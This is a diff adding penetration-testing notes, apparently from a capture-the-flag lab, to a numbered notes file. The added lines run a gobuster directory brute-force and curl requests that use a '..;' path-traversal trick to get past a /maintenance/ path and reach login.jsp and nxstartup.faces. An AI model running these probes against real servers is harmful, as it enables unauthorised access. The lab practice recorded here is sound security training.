@@ -19,3 +19,11 @@ Password: NULL
 Username or Password incorrect
 */
 ==========(3)======================================================================================================================
+Launch http://10.129.10.10:8000/
+
+gobuster dir -q -u http://10.129.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+curl -I "http://10.129.10.10/maintenance/"
+curl -v "http://10.129.10.10/maintenance/..;"
+curl -v "http://10.129.10.10/maintenance/..;/nxstartup.faces"
+http://10.129.96.116/maintenance/..;/login.jsp
+==========(4)======================================================================================================================
